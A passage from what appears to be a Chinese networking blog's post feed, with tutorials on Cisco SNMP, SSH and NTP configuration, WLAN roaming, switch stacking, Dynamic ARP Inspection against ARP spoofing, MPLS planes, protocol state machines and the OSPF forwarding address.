src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134730209-711069314.png"></p><hr><h2 id="snmp"><a href="#snmp" class="headerlink" title="snmp"></a>snmp</h2><p>关于snmp的详解可以参考：</p><p><a href="http://blog.csdn.net/shanzhizi/article/details/11606767">http://blog.csdn.net/shanzhizi/article/details/11606767</a></p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134743302-54942634.png"></p><p>这里重点说一下容易理解错误的地方：<br>get和set消息都是网管主动向agent(设备)发送的<br>get:网管主动向agent获取一些消息（如：设备CPU，内存的使用情况，路由表，接口地址等）<br>set:网管向agent发出一些指令（如：网管要shutdown设备接口，下发路由等）<br>trap消息是agent主动向网管发送一些设备的运行状态消息</p><p><strong>snmp分为三个版本v1,v2c,v3.</strong><br>v1和v2c几乎没有安全性可言，v3新增了加密，完整性校验，身份认证等安全功能。</p><p>snmp v1,v2c和v3的配置有较大的区别。</p><p>snmp v1，v2c的基本配置：</p><p>基本trap配置：</p><pre class="line-numbers language-none"><code class="language-none">snmp-server location xxxxx &#x2F;&#x2F;配置地址，可不配snmp-server contact xxxxx &#x2F;&#x2F;配置联系方式，可不配snmp-server enable traps &#x2F;&#x2F;使能trap功能snmp-server host 10.1.1.100 xxxxx &#x2F;&#x2F;配nms地址，XXXXX为community值或者v3的用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>基本get/set配置：</p><pre class="line-numbers language-none"><code class="language-none">snmp-server community XXXX ro &#x2F;&#x2F;配置读团体值snmp-server community XXXX rw &#x2F;&#x2F;配置读写团体值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>snmp v3的基本配置：</p><p><em>snmp v3可以配置mib节点的读取范围，配置如下</em></p><pre class="line-numbers language-none"><code class="language-none">snmp-server view XXX interfaces included &#x2F;&#x2F;XXX只是一个名字，和下面read和write后面的一致 **interfaces为mib节点的范围**，这个只能配置mib库中的节点名称。snmp-server group groupname v3 priv read  XXX write XXX &#x2F;&#x2F;配置snmp组并引用上方的mib节点读取范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的配置是可选的，snmp v3的基本配置如下：</p><pre class="line-numbers language-none"><code class="language-none">snmp-server user username groupname v3 auth md5 xxxx priv des xxxx &#x2F;&#x2F;配置snmp用户，网管侧网管时需要填写此用户名snmp-server host 10.1.1.100 version 3 priv username &#x2F;&#x2F;配置trap消息的主机地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>snmp v1,v2c和v3在配置上的区别如上，配置过程中可以看到v1和v2c只需要配置一个团体名，NMS侧与其一致即可，v3还需要配置用户名，密码，认证方式等,NMS侧的这些参数都要与一致，当然v3也可以选择不认证不加密。</p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134800256-1531658933.png"></p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134813443-1383681179.png"></p><p><strong>除此外，SNMP还有一些安全机制，借助ACL来实现一些访问控制。</strong></p><hr><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>telnet是目前使用最广泛的网络管理协议，但它存在比较多的安全隐患。SSH或者stelnet由于其比较安全，现在也在广泛使用。<br>关于SSH的工作原理和安全特性参考：<a href="http://http//www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">http://http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></p><p>ssh登录配置：</p><pre class="line-numbers language-none"><code class="language-none">hostname  inside &#x2F;&#x2F;配置主机名为insideip domain name hand123.com  &#x2F;&#x2F;配置域名为hand123.com&#x2F;&#x2F;为什么要配置以上两步，因为思科在生成rsa密钥时的名字为主机名加域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如下：</p><pre class="line-numbers language-none"><code class="language-none">inside(config)#crypto key generate rsa  modulus  2048 &#x2F;&#x2F;生成RSA秘钥% You already have RSA keys defined named inside.hand123.com.% They will be replaced.% The key modulus size is 2048 bits% Generating 2048 bit RSA keys, keys will be non-exportable...[OK] (elapsed time was 1 seconds)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SSH的工作已经完成，下面配置用户名和登录方式：</p><pre class="line-numbers language-none"><code class="language-none">username admin privilege 15 password admin123 &#x2F;&#x2F;p配置用户名和密码line vty 0 15 &#x2F;&#x2F;进入vty接口下login local  &#x2F;&#x2F;配置登录方式为本地认证transport input ssh  &#x2F;&#x2F;配置只允许ssh登录，默认为all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ssh的版本分为v1和v2,可以由命令：<code>ip ssh version [1,2]</code>来控制</p><p>如果版本为1.99，可以兼容版本1和版本2</p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134840271-2109303446.png"></p><p>当然ssh的登录也可以由acl来控制：</p><pre class="line-numbers language-none"><code class="language-none">R1(config)#line vty 0 15R1(config-line)#access-class 1 in<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>路由器SSH登录命令：</p><pre class="line-numbers language-none"><code class="language-none">Router#ssh -l username -v [1,2] password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="NTP"><a href="#NTP" class="headerlink" title="NTP"></a>NTP</h2><p>NTP为网络时间协议，用来同步网络设备的时间，一般为client-server模式，client向网络中的NTP服务器同步时间。<br>比如windows也会想微软的时间服务器同步时间：</p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134902021-1611992519.png"></p><p>时间在网络设备中是非常重要的：比如syslog，pki证书等都必须要求时间准确。</p><p><strong>cisco NTP的配置：</strong></p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134914724-1926190319.png"></p><p>NTP-server:</p><pre class="line-numbers language-none"><code class="language-none">R1(config)#clock timezone GMT +8  &#x2F;&#x2F;配置时区为东八区R1#clock set 13:17:50 sept 24 2017  &#x2F;&#x2F;设置服务器时间R1(config)#ntp authentication-key 1 md5 12345  &#x2F;&#x2F;可选，配置NTP服务器的认证R1(config)#ntp authenticate  &#x2F;&#x2F;可选，开启NTP认证R1(config)#ntp trusted-key 1  &#x2F;&#x2F;可选，配置NTP信任keyR1(config)#ntp master  &#x2F;&#x2F;使能该设备为NTP服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置完成之后，服务器会和自己进行NTP的同步：</p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134935224-968736173.png"></p><p>NTP-client:</p><pre class="line-numbers language-none"><code class="language-none">R2(config)#clock timezone GMT +8  &#x2F;&#x2F;配置时区。NTP是不会同步时区的，只会同步时间R2(config)#ntp authenticateR2(config)#ntp authentication-key 1 md5 12345R2(config)#ntp  trusted-key 1&#x2F;&#x2F;以上三步都是可选的，为NTP的认证R2(config)#ntp  server 10.1.1.1 key 1  &#x2F;&#x2F;配置NTP-server地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看同步情况：<br>可以看到已经同步，并且时间一致</p><p><img src="http://images2017.cnblogs.com/blog/1162008/201710/1162008-20171022134944162-1531497245.png"></p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 应用层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cisco </tag>
            
            <tag> 管理协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WLAN二层漫游和三层漫游</title>
      <link href="2017/06/22/WLAN-2layer-roam-3layer-roam/"/>
      <url>2017/06/22/WLAN-2layer-roam-3layer-roam/</url>
      
        <content type="html"><![CDATA[<p>wlan的漫游分为AC内漫游和AC间漫游。</p><p>AC内的漫游比较简单，不涉及连个AC间的数据同步等问题。配置只需满足一下四个条件即可：</p><ul><li>关联在同一AC上</li><li>配置相同的安全策略</li><li>配置相同的SSID</li><li>如果AC上配置了NAC业务，需要保证下发给各个AP的认证策略和授权策略是相同的。</li></ul><p>AC间的漫游相对复杂，因为需要同步两个AC间的数据，还要考虑AP和AC之间的组网类型。</p><p><strong>漫游域</strong><br>根据STA是否在同一个子网内漫游，可以将漫游分为二层漫游和三层漫游。</p><ul><li>如果两个子网的VLAN ID不同，那么这两个子网是处于不同的网段，STA在这两个子网间漫游是属于三层漫游。</li></ul><p>网络中有时候会出现以下情况：两个子网的VLAN     </p><ul><li>ID相同，但是这两个子网又属于不同的子网。此时为了避免系统仅仅依据VLAN   </li><li>ID将用户在两个子网间的漫游误判为二层漫游，需要通过漫游域来确定设备是否在同一个子网内，只有当VLAN相同且漫游域也相同的时候才是二层漫游，否则是三层漫游。</li></ul><p><strong>WLAN漫游场景:</strong></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/5989fdbd71b56d64114b9c75b5fc953c-1024x603.png" alt="5989fdbd71b56d64114b9c75b5fc953c-1024x603.png"></p><p>上图中分别描述了在二层漫游和三层漫游中不同转发场景的业务数据走向。</p><p><strong>二层漫游：</strong><br>二层漫游后STA仍然在原来的子网中，FAP/FAC对二层漫游用户的报文转发同普通新上线用户没有区别，直接在FAP/FAC本地的网络转发，不需要通过AC间隧道转回到HAP/HAC中转。</p><p><strong>三层漫游：</strong><br>三层漫游时，用户漫游前后不在同一个子网中，为了支持用户漫游后仍能正常访问漫游前的网络，需要将用户流量通过隧道转发到原来的子网进行中转。</p><ul><li><p>隧道转发模式下，HAP和HAC之间的业务报文通过CAPWAP隧道封装，此时可以将HAP和HAC看作在同一个子网内，报文无需返回到HAP，直接通过HAC进行中转到上层网络。</p></li><li><p>直接转发模式下，HAP和HAC之间的业务报文不通过CAPWAP隧道封装，无法判定HAP和HAC是否在同一个子网内，此时设备默认报文需要返回到HAP进行中转。如果HAP和HAC在同一个子网时，可以将家乡代理设置为性能更强的HAC，减少HAP的负荷并提高转发效率。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> wlan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wlan </tag>
            
            <tag> wlan漫游 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二层转发和三层转发的区别</title>
      <link href="2017/06/19/2layer-3layer-forward-diff/"/>
      <url>2017/06/19/2layer-3layer-forward-diff/</url>
      
        <content type="html"><![CDATA[<p>数据包在网络中进行数据包的转发时，有时会进行二层转发有时会进行三层转发。但这两种转发的原理是什么，有什么区别呢？</p><p>我们知道两台设备在进行数据通信之前必须有两个地址：IP地址和MAC地址。<br>IP地址用来做三层的封装，MAC地址用来做二层的封装。</p><p>假设PC1和PC2进行通信：</p><p>数据转发是由设备进行的，那么判断何时用二层转发，何时用三层转发也是由设备决定的。<br>这时IP地址就起作用了，设备会将两个IP地址分别和它们的掩码相与，如果网络号相同则在同一个网段。如果在同一个网段，PC1会发ARP广播报文请求PC2的MAC地址，请求到以后进行数据包的封装转发。（三层的源目IP分别为PC1和PC2的IP地址，二层的源目MAC分别为PC1和PC2的MAC地址）</p><p>如果不在同一网段，PC1配置了网关，则PC1会发送ARP广播报文请求网关的MAC地址，请求到以后进行数据包的封装。（三层的源目IP依旧为PC1和PC2的IP地址，但二层的源目MAC分别为PC1和网关的MAC地址）数据包交给网关后，网关在依据目的IP地址（PC2的IP地址）查找路由进行寻址转发。</p><h3 id="有关三层交换机和路由器的区别？"><a href="#有关三层交换机和路由器的区别？" class="headerlink" title="有关三层交换机和路由器的区别？"></a>有关三层交换机和路由器的区别？</h3><p>在网上看到了一篇文章写的不错，见下方参考;</p><p><strong>这里先总结一下吧：</strong></p><p>三层交换技术的出现，解决了局域网中网段划分之后，网段中子网必须依赖路由器进行管理的局面，解决了传统路由器低速、复杂所造成的网络瓶颈问题。<br>其原理是：假设两个使用IP协议的站点A、B通过第三层交换机进行通信，发送站点A在开始发送时，把自己的IP地址与B站的IP地址比较，判断B站是否与自己在同一子网内。若目的站B与发送站A在同一子网内，则进行二层的转发。若两个站点不在同一子网内，如发送站A要与目的站B通信，发送站A要向“缺省网关”发出ARP(地址解析)封包，而“缺省网关”的IP地址其实是三层交换机的三层交换模块。当发送站A对“缺省网关”的IP地址广播出一个ARP请求时，如果三层交换模块在以前的通信过程中已经知道B站的MAC地址，则向发送站A回复B的MAC地址。否则三层交换模块根据路由信息向B站广播一个ARP请求，B站得到此ARP请求后向三层交换模块回复其MAC地址，<strong>三层交换模块保存此地址并回复给发送站A,同时将B站的MAC地址发送到二层交换引擎的MAC地址表中。从这以后，当A向B发送的数据包便全部交给二层交换处理，信息得以高速交换。由于仅仅在路由过程中才需要三层处理，绝大部分数据都通过二层交换转发，因此三层交换机的速度很快，接近二层交换机的速度，同时比相同路由器的价格低很多。</strong></p><p>参考：<a href="http://blog.csdn.net/shmily_cml0603/article/details/9334795">http://blog.csdn.net/shmily_cml0603/article/details/9334795</a></p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二三层转发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆叠简介</title>
      <link href="2017/06/16/istack-intro/"/>
      <url>2017/06/16/istack-intro/</url>
      
        <content type="html"><![CDATA[<p>堆叠的过程和VRRP组形成的过程很类似，大体包括：主备的选举（<em>在VRRP中选举出主设备后其余的都是被设备，在堆叠中除了选举主设备和备设备还要选举从设备</em>），拓扑收集，状态同步（在堆叠中需要同步版本信息和配置信息），稳定运行，成员的加入与退出等。</p><p>上述过程只是粗略的描述了一下，VRRP组和堆叠在细节上还是有很大不同的。下面简单介绍下堆叠的原理，作用，堆叠的形成过程。<br>堆叠的合并，分裂，成员的加入退出过程后续文章会慢慢介绍。</p><h2 id="堆叠简介："><a href="#堆叠简介：" class="headerlink" title="堆叠简介："></a>堆叠简介：</h2><p>堆叠iStack（Intelligent Stack），是指将多台支持堆叠特性的交换机设备组合在一起，从逻辑上组合成一台交换设备。如下图：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/673ef670dab3852b049840762acc14a6.png" alt="673ef670dab3852b049840762acc14a6.png"></p><h2 id="堆叠优点："><a href="#堆叠优点：" class="headerlink" title="堆叠优点："></a>堆叠优点：</h2><p>通过交换机堆叠，可以实现网络高可靠性和网络大数据量转发，同时简化网络管理。</p><ul><li>高可靠性。堆叠系统多台成员交换机之间冗余备份；堆叠支持跨设备的链路聚合功能，实现跨设备的链路冗余备份。</li><li>强大的网络扩展能力。通过增加成员交换机，可以轻松的扩展堆叠系统的端口数、带宽和处理能力；同时支持成员交换机热插拔，新加入的成员交换机自动同步主交换机的配置文件和系统软件版本。</li><li>简化配置和管理。一方面，用户可以通过任何一台成员交换机登录堆叠系统，对堆叠系统所有成员交换机进行统一配置和管理；另一方面，堆叠形成后，不需要配置复杂的二层破环协议（如MSTP）和三层保护倒换协议（如VRRP），简化了网络配置。</li></ul><h2 id="堆叠原理："><a href="#堆叠原理：" class="headerlink" title="堆叠原理："></a>堆叠原理：</h2><p><strong>先介绍下堆叠的一些基本概念吧：</strong><br>主设备：负责管理整个堆叠<br>从设备：作为主设备的备份，一旦主设备挂掉，从设备会承担主设备的业务<br>从设备：主要用于业务转发，从交换机数量越多，堆叠系统的转发能力越强。除主交换机和备交换机外，         堆叠中其他所有的成员交换机都是从交换机。<br>堆叠ID：即成员交换机的槽位号（SlotID），用来标识和管理成员交换机，堆叠中所有成员交换机的堆叠         ID都是唯一的。<br>堆叠优先级：堆叠优先级是成员交换机的一个属性，主要用于角色选举过程中确定成员交换机的角色，优             先级值越大表示优先级越高，优先级越高当选为主交换机的可能性越大。</p><h2 id="堆叠的建立："><a href="#堆叠的建立：" class="headerlink" title="堆叠的建立："></a>堆叠的建立：</h2><p><strong>堆叠建立的过程包括以下四个阶段：</strong></p><ol><li>物理连接：根据网络需求，选择适当的连接方式和连接拓扑，组建堆叠网络。</li><li>主设备选举：成员交换机之间相互发送堆叠竞争报文，并根据选举原则，选出堆叠系统主设备。</li><li>拓扑收集和备设备选举：主设备收集所有成员交换机的拓扑信息，向所有成员设备分配堆叠ID    ，之后选出堆叠系统备设备。</li><li>稳定运行：主设备将整个堆叠系统的拓扑信息同步给所有成员设备，成员设备同步主涉笔的系统软件和配置文件，之后进入稳定运行状态。</li></ol><h2 id="下面说一下每个过程的重点内容："><a href="#下面说一下每个过程的重点内容：" class="headerlink" title="下面说一下每个过程的重点内容："></a>下面说一下每个过程的重点内容：</h2><p>物理连接：物理连接分为链形堆叠和环形堆叠。</p><p><img src="https://i.ooxx.ooo/2017/09/10/df4b64a1142dd79e7a4aa4f365031db2.png"></p><p>主设备选举：选举规则：<br>1.运行状态比较，已经运行的交换机优先处于启动状态的交换机竞争为主交换机。</p><blockquote><p>堆叠主交换机选举超时时间为20s，堆叠成员交换机上电或重启时，由于不同成员交换机所需的启动时间可能差异比较大，因此不是所有成员交换机都有机会参与主交换机的选举：启动时间与启动最快的成员交换机相比，相差超过20s的成员交换机没有机会参与主交换机的选举，只能被动加入堆叠成为非主交换机，加入过程可参见堆叠成员加入与退出。</p></blockquote><p>因此，如果希望指定某一成员交换机成为主交换机，则可以先为其上电，待其启动完成后再给其他成员交换机上电。</p><p>2.堆叠优先级高的交换机优先竞争为主交换机。</p><p>3.堆叠优先级相同时，MAC地址小的交换机优先竞争为主交换机。</p><p>备设备选举：选举规则：</p><p>除主交换机外最先完成设备启动的交换机优先被选为备份交换机。当除主交换机外其它交换机同时完成启动时，备交换机的选举规则如下（依次从第一条开始判断，直至找到最优的交换机才停止比较）：</p><p>1.堆叠优先级最高的设备成为备交换机。<br>2.堆叠优先级相同时，MAC地址最小的成为备交换机。<br>  除主交换机和备交换机之外，剩下的其他成员交换机作为从交换机加入堆叠。</p><p>稳定运行：角色选举、拓扑收集完成之后，所有成员交换机会自动同步主交换机的<strong>系统软件和配置文件</strong></p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 高可靠 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆叠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态ARP检测（DAI）</title>
      <link href="2017/06/09/DAI/"/>
      <url>2017/06/09/DAI/</url>
      
        <content type="html"><![CDATA[<p>网络中针对ARP的攻击层出不穷，中间人攻击是常见的ARP欺骗攻击方式之一。</p><p>中间人攻击（Man-in-the-middle attack）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。</p><p>如图所示，是中间人攻击的一个场景。攻击者主动向UserA发送伪造UserB的ARP报文，导致UserA的ARP表中记录了错误的UserB地址映射关系，攻击者可以轻易获取到UserA原本要发往UserB的数据；同样，攻击者也可以轻易获取到UserB原本要发往UserA的数据。这样，UserA与UserB间的信息安全无法得到保障。</p><p>中间人攻击:</p><p><img src="https://i.loli.net/2019/02/24/5c72823b12207.gif" alt="fig_dc_fd_ARP_SEC_001001ar1.gif"></p><p>为了防御中间人攻击，可以在Router上部署 <strong>动态ARP检测DAI（Dynamic ARP Inspection</strong> 功能。</p><p>动态ARP检测是利用绑定表来防御中间人攻击的。当设备收到ARP报文时，将此ARP报文对应的源IP、源MAC、VLAN以及接口信息和绑定表的信息进行比较，如果信息匹配，说明发送该ARP报文的用户是合法用户，允许此用户的ARP报文通过，否则就认为是攻击，丢弃该ARP报文。</p><blockquote><p>说明：<br>动态ARP检测功能仅适用于DHCP Snooping场景。设备使能DHCP Snooping功能后，<br>当DHCP用户上线时，设备会自动生成DHCP Snooping绑定表；<br>对于静态配置IP地址的用户，设备不会生成DHCP Snooping绑定表，所以需要手动添加静态绑定表。</p></blockquote><p>当Router上部署动态ARP检测功能后，如果攻击者连接到Router并试图发送伪造的ARP报文，Router会根据绑定表检测到这种攻击行为，对该ARP报文进行丢弃处理。如果Router上同时使能了动态ARP检测丢弃报文告警功能，则当ARP报文因不匹配绑定表而被丢弃的数量超过了告警阈值时，Router会发出告警通知管理员。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> ARP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MPLS控制平面和数据平面</title>
      <link href="2017/01/21/MPLS-control-plane-forwarding-plane/"/>
      <url>2017/01/21/MPLS-control-plane-forwarding-plane/</url>
      
        <content type="html"><![CDATA[<p>MPLS 的体系结构由控制平面（Control Plane）和转发平面（Forwarding Plane）组成。<br>MPLS 体系结构如图。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/EcGsnCL.jpg" alt="EcGsnCL.jpg"></p><p>控制平面是无连接的，主要功能是负责产生和维护路由信息以及标签信息。</p><p>控制平面中IP 路由协议（IP Routing Protocol）模块用来传递路由信息，生成路由信息表；标签分发协议（Label Distributiion Protocol）模块用来完成标签信息的交换，建立标签转发路径。转发平面也称为数据平面（Data Plane），是面向连接的， 主要功能是负责普通IP 报文的转发以及带MPLS 标签报文的转发。</p><p>数据平面包括IP 转发信息表（Forwarding Information Base）和标签转发信息表（LabelForwarding Information Base），当收到普通IP 报文时，如果是普通IP 转发，则查找IP 路由表转发，如果需要标签转发，则按照标签转发表转发；当收到带有标签的报文时，如果需要 按照标签转发，根据标签转发表转发，如果需要转发到IP 网络，则去掉标签后根据IP 转发。</p><p>参考：<a href="http://361531.blog.51cto.com/351531/1693692/">http://361531.blog.51cto.com/351531/1693692/</a></p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> MPLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MPLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ppp，ospf，BGP,LDP状态机总结</title>
      <link href="2017/01/18/ppp-ospf-BGP-LDP-state-summary/"/>
      <url>2017/01/18/ppp-ospf-BGP-LDP-state-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="ppp状态机"><a href="#ppp状态机" class="headerlink" title="ppp状态机"></a>ppp状态机</h2><p><img src="https://i.ooxx.ooo/2017/09/16/26f1abae534ea0de16288dd026bee9a9.png"></p><ol><li>Dead阶段为物理链路不可用阶段，当设备通电，两端物理链路up，就从Dead阶段变为Establish阶段即链路建立阶段。</li><li>在Establish阶段进行lcp的协商，协商内容包括最大接收单元MRU、认证方式、魔术字（Magic Number）等选项。LCP参数协商成功后会进入Opened状态，表示底层链路已经建立。 在此阶段用到的报文有：config-resuest，config-Ack，config-Nak，config-Reject</li><li>在链路协商阶段一般会经过认证后才可以进行下一阶段的协商即ncp的协商，认证阶段是可选的。</li><li>当LCP协商通过后会进入NCP的协商阶段，此阶段用来协商PPP帧上层承载的网络层协议比如IP或者IPX等。只有NCP协商通过后相应的网络层协议才可以通过ppp链路传送。</li><li>NCP协商成功后，PPP链路将保持通信状态。PPP运行过程中，可以随时中断连接，例如物理链路断开、认证失败、超时定时器时间、管理员通过配置关闭连接等动作都可能导致链路进入Terminate阶段。</li><li>在Terminate阶段，如果所有的资源都被释放，通信双方将回到Dead阶段，直到通信双方重新建立PPP连接。</li></ol><h2 id="ospf状态机"><a href="#ospf状态机" class="headerlink" title="ospf状态机"></a>ospf状态机</h2><img src="https://i.loli.net/2018/03/26/5ab8f8809568e.png" alt="ospfzhuangtaiji.png" title="ospfzhuangtaiji.png" /><img src="https://i.loli.net/2018/03/26/5ab8f88093cf0.png" alt="ospf1.png" title="ospf1.png" /><ol><li>Down状态：这是邻居的初始状态，表示没有从邻居收到任何信息。在NBMA网络上，此状态下仍然可以向静态配置的邻居发送Hello报文，发送间隔为PollInterval，通常和RouterDeadInterval间隔相同。</li><li>init状态：当我从邻居收到了hello报文，但我的邻居列表中没有对端的信息，此时就是init状态。此状态下表示双方未建立双向的通信关系。3.Attempt状态：此状态只在NBMA网络上存在，表示没有收到邻居的任何信息，但是已经周期性的向邻居发送报文，发送间隔为HelloInterval。如果RouterDeadInterval间隔内未收到邻居的Hello报文，则转为Down状态。</li><li>2-Way状态：此状态表示邻居双方已经建立了ospf邻居关系，但没有建立ospf邻接关系，还没有开始交互ospf的其它协议报文。在MA网络中，此状态正在选举DR和BDR。</li><li>EXStart状态：这是形成邻接关系的第一个步骤，邻居状态变成此状态以后，路由器开始向邻居发送DD报文。主从关系是在此状态下形成的；初始DD序列号是在此状态下决定的。在此状态下发送的DD报文不包含链路状态描述。</li><li>Exchange状态：此状态下路由器相互发送包含链路状态信息摘要的DD报文，描述本地LSDB的内容。</li><li>Loading：相互发送LS Request报文请求LSA，发送LS Update通告LSA。8.Full：两路由器的LSDB已经同步。</li></ol><h2 id="BGP状态机"><a href="#BGP状态机" class="headerlink" title="BGP状态机"></a>BGP状态机</h2><img src="https://i.loli.net/2018/03/26/5ab8fa675fad9.png" alt="bgpzhuangtaiji.png" title="bgpzhuangtaiji.png" /><ol><li>Idle：此状态为BGP状态的初识状态，还没有开始交互BGP报文。</li><li>Connect：当两台路由器都配置了BGP并指了peer，邻居开始建立TCP连接。因为某些原因TCP连接无法建立时会进入Idle状态。</li><li>Ative：如果TCP连接建立失败。BGP过程会继续监听由邻居发起的连接、重置ConnectRetry计时器并转移到激活状态。在这个状态下，BGP过程试图与邻居建立一个TCP连接。如果TCP连接建立成功，BGP过程将ConnectRetry清零，完成初始化工作，给邻居发送一个Open消息并转移到发送Open消息状态。</li><li>OpenSent :当TCP连接建立成功后，开始互两端路由器相发送open报文协商参数，如AS号，BGP版本等，如果协商通过则BGP邻居建立成功。5.OpenConfirm：当open报文协商通过后，开始进入此状态。并向对端发送Keepaliv报文。6.Establieshed：收到对端的keepalive报文后进入此状态，此状态是BGP 邻居建立的最终状态。7.在OpenSent，OpenConfirm,Establieshed这三个状态遇到TCP连接关闭，有错误，或处理UPDATE消息失败，或收到NOTIFICATION消息都会进入Idle状态。</li></ol><h2 id="LDP状态机"><a href="#LDP状态机" class="headerlink" title="LDP状态机"></a>LDP状态机</h2><img src="https://i.loli.net/2018/03/26/5ab8fb4649674.png" alt="ldpzhuangtaiji.png" title="ldpzhuangtaiji.png" /><ol><li>NonExistent: 当使能了MPLS LDP协议后，LDP Session未建立的初始化状态。</li><li>Initialized：当LSR互相发送hello包，hello包中携带TransportAddress，由TransportAddress大的一端发起TCP连接，TCP连接建立后进入此状态。</li><li>OPENSENT：进入初始化状态后，有主动段发送init消息协商LDP相关参数（包括LDP 协议版本、标签分发方式、Keepalive 保持定时器的值、最大PDU 长度和标签空间等）。</li><li>OPENREC：当被动端收到init消息后，如果接受这些参数，就会进入此状态并向主动端发送init消息。主动端收到init消息后也进入此状态。然后被动段发送keepalive消息给主动端。</li><li>Operational：当主动段收到keepalive消息后进入此状态，然后向被动端发送keepalive消息。被动端收到keepalive消息后也进入此状态。当双方都收到对端的Keepalive 消息后，LDP 会话建立成功。OPERATIONAL状态也是LDP会话建立的最终状态。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 三层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ospf </tag>
            
            <tag> ppp </tag>
            
            <tag> bgp </tag>
            
            <tag> ldp </tag>
            
            <tag> 状态机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ospf FA地址浅谈</title>
      <link href="2017/01/13/ospf-FA-address/"/>
      <url>2017/01/13/ospf-FA-address/</url>
      
        <content type="html"><![CDATA[<p>FA地址（Forwarding Address）是在ospf五类lsa和七类lsa中携带，用来在区域间防止次优路径的产生和环路的发生。</p><p><strong>五类LSA中的FA地址：</strong></p><img src="https://i.loli.net/2018/03/26/5ab8f80af24c2.png" alt="fadizhimiaoshu.png" title="fadizhimiaoshu.png" /><p>本例中如果没有FA地址，那么将这条静态路由引入到OSPF中后，对于ospf来说，这是一条外部路由，RTA访问RTC时将会查找路由表发现下一跳为RTB，于是产生次优路径。当存在FA地址后，此时五类LSA中的FA地址会设置为10.1.1.3 RTA再次访问RTC时将会按照FA地址作为下一跳从而避免了次优路径的产生。</p><p><strong>FA地址是否为0的规则：</strong></p><p>通常情况下，生成AS-External-LSA时，Forwarding Address设置为0.0.0.0。</p><p>但是如果引入到OSPF中的外部路由的下一跳在一个OSPF路由域内，则在描述该外部路由的AS-External-LSA中，Forwarding Address应当被设置为ASBR路由表中该路由的下一跳。</p><p>如果Forwarding Address没有被设置为0，则该路由的下一跳就是路由表中到Forwarding Address的下一跳。</p><p><strong>七类LSA FA地址和五类略微不同：</strong></p><p>NSSA FA地址详解：</p><p>如果Options字段显示此LSA不可以被转换成五类LSA，FA地址可以被设置成0.0.0.0；</p><p>如果Options字段显示此LSA可以被转换成五类LSA，FA地址不可以被设置成0.0.0.0；</p><p>如果所引入外部路由的下一跳在OSPF路由域内，则FA直接设置为所引入外部路由的下一跳；</p><p>如果所引入外部路由的下一跳不在OSPF路由域内，则FA地址设置为该ASBR上某个OSPF路由域内的Stub网段（例如LOOPBACK0接口）的接口IP地址，有多个Stub网段时选IP地址最大者。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ospf </tag>
            
            <tag> FA-address </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>STP和RSTP的比较</title>
      <link href="2016/12/19/STP-RST-diff/"/>
      <url>2016/12/19/STP-RST-diff/</url>
      
